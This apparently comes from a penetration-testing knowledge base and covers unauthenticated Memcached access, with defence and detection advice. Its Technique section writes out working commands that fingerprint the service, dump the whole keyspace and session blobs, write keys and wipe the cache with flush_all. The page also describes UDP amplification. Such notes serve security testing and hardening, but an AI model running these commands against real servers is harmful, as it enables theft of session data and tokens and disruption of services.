---
title: Memcached Enumeration and Amplification
slug: memcache-attacks
---

> **TL;DR:** Memcached on 11211 ships with no authentication, returns the entire keyspace to anyone who can connect, and the UDP variant amplifies traffic by 50,000x — the same primitive behind the 1.7 Tbps GitHub DDoS.

## What it is
Memcached is an in-memory key-value cache used in front of databases for session storage, fragment caching, and rate-limit counters. The text protocol is line-oriented and stateless; there is no concept of users until the optional SASL build is enabled. Anything stored in the cache — Django sessions, JWTs being staged, internal API responses — is dumpable by a single TCP connect.

## Preconditions / where it applies
- TCP/11211 (and historically UDP/11211 until 1.5.6, March 2018)
- Default install has no auth; SASL must be compiled in and explicitly turned on
- Found inside app-tier VLANs but also accidentally on public cloud instances (security-group typos)
- Reachable from any SSRF on the same host because it listens on 0.0.0.0 by default

## Technique
```bash
# Fingerprint
nmap -p 11211 --script memcached-info 10.0.0.30

# Manual interrogation
nc 10.0.0.30 11211
stats
version
stats items
stats cachedump 1 1000     # slab 1, up to 1000 keys
get sess:abc123            # pull a session blob
set pwned 0 60 5\r\nhello   # write a key
flush_all                  # nuke the cache (DoS)

# Bulk dump
memcdump --servers=10.0.0.30:11211 | head
for k in $(memcdump --servers=10.0.0.30:11211); do
  echo "=== $k ==="; memccat --servers=10.0.0.30:11211 "$k"
done

# UDP amplification (Memcrashed / CVE-2018-1000115) — DO NOT fire at third parties
# A 15-byte stats request returns up to ~750 KB if large keys were prestaged
```

## Detection and defence
- Bind to 127.0.0.1 or a private interface: `-l 127.0.0.1`
- Disable UDP: `-U 0` (default since 1.5.6)
- Enable SASL and require a credential, or front with stunnel/mTLS
- Network ACLs / security groups: deny 11211 ingress from anywhere except app servers
- Detect: NetFlow showing UDP/11211 responses to spoofed src ports, or unexpected `stats cachedump` from non-app hosts

## References
- [memcached release notes 1.5.6](https://github.com/memcached/memcached/wiki/ReleaseNotes156) — UDP disabled by default
- [Cloudflare Memcrashed write-up](https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/) — 1.7 Tbps DDoS analysis

See also: [[redis-enum]], [[exposed-services]], [[port-scanning]].
